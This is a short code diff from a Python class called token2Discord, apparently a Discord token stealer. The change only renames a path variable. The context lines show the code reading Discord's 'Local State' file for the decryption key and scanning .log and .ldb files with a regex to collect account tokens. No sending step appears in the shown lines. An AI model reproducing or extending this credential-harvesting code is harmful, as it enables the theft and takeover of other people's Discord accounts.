@@ -58,7 +58,7 @@ class token2Discord:
             return "Failed to decrypt token"
 
     def getKey(self):
-        with open(self.pc_roaming+'\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
+        with open(self._ROAMING+'\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
 
@@ -81,7 +81,7 @@ class token2Discord:
                             for token in findall(regex, line):
                                 self.tokens.append(token)
             else:
-                if os.path.exists(self.pc_roaming+'\\discord\\Local State'):
+                if os.path.exists(self._ROAMING + '\\discord\\Local State'):
                     for file_name in os.listdir(path):
                         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                             continue
